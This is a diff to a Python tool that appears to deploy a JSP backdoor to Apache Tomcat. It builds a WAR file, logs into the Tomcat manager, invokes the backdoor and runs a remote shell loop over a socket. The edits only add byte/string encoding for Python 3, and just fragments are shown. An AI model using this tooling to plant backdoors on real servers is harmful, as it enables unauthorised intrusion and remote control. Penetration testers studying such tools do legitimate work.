@@ -109,11 +109,11 @@ def issueCommand(sock, cmd, isWindows, path = ''):
     else:
         cmd = cmd + '\n'
 
-    sock.send(cmd)
+    sock.send(cmd.encode())
     res = recvall(sock).strip()
 
     if isWindows:
-        res = res.replace(cmd, '')
+        res = res.decode().replace(cmd, '')
         lines = res.split('\r\n')
 
         if len(lines) > 2 and lines[-2].strip() == '' \
@@ -133,7 +133,7 @@ def shellLoop(sock, host):
     try:
         try:
             sock.settimeout(1.0)
-            initialRecv = recvall(sock)
+            initialRecv = recvall(sock).decode()
             sock.settimeout(None)
         except: 
             pass
@@ -294,7 +294,7 @@ def generateWAR(code, title, appname):
     with open(dirpath + '/index.jsp', 'w') as f:
         f.write(code)
 
-    javaver = execcmd('java -version')
+    javaver = execcmd('java -version').decode()
     m = re.search('version "([^"]+)"', javaver, re.M|re.I)
     if m:
         javaver = m.group(1)
@@ -371,7 +371,7 @@ Created-By: %s (Sun Microsystems Inc.)
     os.chdir(cwd)
     logger.debug(packing)
 
-    tree = execcmd('tree %s' % dirpath)
+    tree = execcmd('tree %s' % dirpath).decode()
     if not ('sh' in tree and 'tree: not found' in tree):
         logger.debug('WAR file structure:')
         logger.debug(tree)
@@ -596,7 +596,7 @@ def invokeApplication(browser, url, opts):
             SHELLEVENT.set()
 
         resp = browser.open(appurl)
-        src = resp.read()
+        src = resp.read().decode()
         if 'JSP Backdoor deployed as WAR on Apache Tomcat.' in src:
             logger.debug('Application invoked correctly.')
             return True
@@ -859,7 +859,7 @@ def browseToManager(host, url, user, password):
             browser.add_password(managerurl, user, password)
             page = browser.open(managerurl)
 
-            data = page.read()
+            data = page.read().decode()
             m = re.search('Apache Tomcat/([^<]+)', data)
             if m:
                 logger.debug('Probably found something: Apache Tomcat/%s' % m.group(1))
